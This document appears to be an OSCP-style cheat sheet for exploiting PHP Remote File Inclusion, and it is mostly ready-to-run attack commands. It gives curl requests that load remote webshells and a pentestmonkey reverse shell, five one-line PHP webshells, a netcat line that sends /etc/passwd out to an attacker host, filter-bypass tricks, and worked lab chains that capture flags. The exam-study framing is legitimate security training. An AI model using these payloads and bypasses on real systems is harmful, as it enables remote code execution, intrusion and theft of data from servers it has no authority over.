# RFI (Remote File Inclusion) Quick Reference Guide

## Overview
Remote File Inclusion allows attackers to include and execute files from remote servers. Requires `allow_url_include=On` in PHP configuration.

## Detection & Discovery

### Initial Testing
```bash
# Basic RFI test - include remote text file
curl "http://TARGET/index.php?page=http://ATTACKER/test.txt"
# Look for: Remote content appearing in response

# Test with PHP file
curl "http://TARGET/index.php?page=http://ATTACKER/info.php"
# info.php contains: <?php phpinfo(); ?>
```

### Common Parameters to Test
- `?page=`
- `?file=`
- `?include=`
- `?path=`
- `?template=`
- `?lang=`

## Exploitation Techniques

### 1. Simple Webshell Inclusion
```bash
# Host simple-backdoor.php
cd /usr/share/webshells/php/
sudo python3 -m http.server 80
# -m http.server: Python module for HTTP server
# 80: Port (requires sudo for <1024)

# Include and execute
curl "http://TARGET/index.php?page=http://ATTACKER/simple-backdoor.php&cmd=id"
# page=: RFI vulnerable parameter
# &cmd=: Command parameter for webshell
```

### 2. Pentestmonkey Reverse Shell
```bash
# Download and modify reverse shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i 's/127.0.0.1/YOUR_IP/g; s/1234/4444/g' php-reverse-shell.php
# sed -i: Edit file in place
# s/old/new/g: Global substitution

# Start listener
nc -nvlp 4444
# -n: No DNS lookup
# -v: Verbose
# -l: Listen mode
# -p 4444: Port to listen on

# Trigger reverse shell
curl "http://TARGET/index.php?page=http://ATTACKER/php-reverse-shell.php"
```

### 3. Command Execution Variations
```bash
# Method 1: Direct system() call
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Method 2: Using passthru()
echo '<?php passthru($_REQUEST["cmd"]); ?>' > shell2.php

# Method 3: Using shell_exec()
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell3.php

# Method 4: Backticks
echo '<?php echo `$_GET["cmd"]`; ?>' > shell4.php

# Method 5: eval() for PHP code
echo '<?php eval($_GET["code"]); ?>' > shell5.php
```

## Real Attack Chain Examples

### Example 1: Simple Webshell to Flag
```bash
# Terminal 1: Start server
cd /usr/share/webshells/php/ && sudo python3 -m http.server 80

# Terminal 2: Execute commands
# Test connection
curl "http://192.168.133.16/meteor/index.php?page=http://192.168.45.243/simple-backdoor.php&cmd=id"
# Output: uid=33(www-data) gid=33(www-data)

# Check sudo privileges
curl "http://192.168.133.16/meteor/index.php?page=http://192.168.45.243/simple-backdoor.php&cmd=sudo%20-l"

# Read flag
curl "http://192.168.133.16/meteor/index.php?page=http://192.168.45.243/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
# Found: command = "OS{507ba11e48a7dc1d15045cf1129a69a8}"
```

### Example 2: Reverse Shell Method
```bash
# Terminal 1: Prepare and serve payload
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i 's/127.0.0.1/192.168.45.243/g; s/1234/4444/g' php-reverse-shell.php
python3 -m http.server 8080

# Terminal 2: Start listener
nc -nvlp 4444

# Terminal 3: Trigger
curl "http://192.168.133.16:8001/meteor/index.php?page=http://192.168.45.243:8080/php-reverse-shell.php"

# In reverse shell:
sudo -l  # Check privileges
sudo cat /home/guybrush/.treasure/flag.txt
# Found: OS{b3525be0b0a9f449575829748b04f579}
```

## Non-Interactive Exploitation

### Direct Command Output
```bash
# Single command execution
curl -s "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=cat%20/etc/passwd"

# Command chaining
curl -s "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=id%20%26%26%20whoami%20%26%26%20pwd"
# %26%26 = URL encoded &&
```

### Data Exfiltration
```bash
# Method 1: Write to web directory
curl "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=cat%20/etc/passwd%20>%20/var/www/html/output.txt"
curl "http://TARGET/output.txt"

# Method 2: Netcat exfiltration
nc -lvp 5555  # On attacker machine
curl "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=cat%20/etc/passwd%20|%20nc%20ATTACKER_IP%205555"

# Method 3: Base64 encode and echo
curl "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=cat%20/etc/passwd%20|%20base64"
```

## URL Encoding Reference
| Character | Encoded | Usage |
|-----------|---------|-------|
| Space | %20 or + | Command separation |
| & | %26 | Command chaining |
| | | %7C | Pipe operations |
| > | %3E | Output redirection |
| < | %3C | Input redirection |
| " | %22 | Quotes |
| ' | %27 | Single quotes |
| ; | %3B | Command separator |
| / | %2F | Path separator |
| \ | %5C | Backslash |

## Alternative Protocols

### SMB (Windows)
```bash
# Include file from SMB share
curl "http://TARGET/vuln.php?page=\\\\ATTACKER\\share\\shell.php"
```

### FTP
```bash
# Include from FTP (if allow_url_fopen is enabled)
curl "http://TARGET/vuln.php?page=ftp://user:pass@ATTACKER/shell.php"
```

## Bypassing Filters

### Case Variation
```bash
# If "http" is blocked
curl "http://TARGET/vuln.php?page=hTTp://ATTACKER/shell.php"
curl "http://TARGET/vuln.php?page=HTTP://ATTACKER/shell.php"
```

### URL Shorteners
```bash
# Use URL shortener to hide direct IP
curl "http://TARGET/vuln.php?page=http://bit.ly/SHORTENED"
```

### Double Encoding
```bash
# If certain characters are filtered
# %20 becomes %2520
curl "http://TARGET/vuln.php?page=http://ATTACKER/shell.php&cmd=id%2520-a"
```

## Troubleshooting

### Common Issues & Solutions
| Issue | Check | Solution |
|-------|-------|----------|
| No response | Server logs | Verify HTTP server receives request |
| PHP not executing | Content-Type | Ensure .php extension on included file |
| Connection refused | Firewall | Try different ports (8080, 8000) |
| Partial execution | Error logs | Check PHP error_reporting |
| Permission denied | User context | Check www-data permissions |

### Verification Commands
```bash
# Check if allow_url_include is enabled
curl "http://TARGET/vuln.php?page=http://ATTACKER/phpinfo.php" | grep allow_url_include

# Test basic connectivity
curl "http://TARGET/vuln.php?page=http://ATTACKER/test.txt"

# Check server logs for requests
tail -f access.log  # On attacking machine
```

## OSCP Exam Tips

1. **Always test non-interactive methods first** - Simpler and less likely to fail
2. **Document all commands** - Include full syntax with flags
3. **Use multiple terminals** - Server, listener, execution
4. **Save output** - Pipe to files for evidence
5. **Try different ports** - 80, 8080, 8000 if filtered
6. **Check sudo privileges** - May have NOPASSWD access
7. **Look for flags in**:
   - SSH authorized_keys command restrictions
   - User home directories
   - Hidden .treasure or similar directories
   - Web root directories

## Quick Commands Cheatsheet
```bash
# Start HTTP server
sudo python3 -m http.server 80

# Basic RFI test
curl "http://TARGET/index.php?page=http://ATTACKER/shell.php&cmd=id"

# Reverse shell listener
nc -nvlp 4444

# URL encode space
%20 or +

# Chain commands
&& = %26%26

# Common webshell location
/usr/share/webshells/php/simple-backdoor.php
```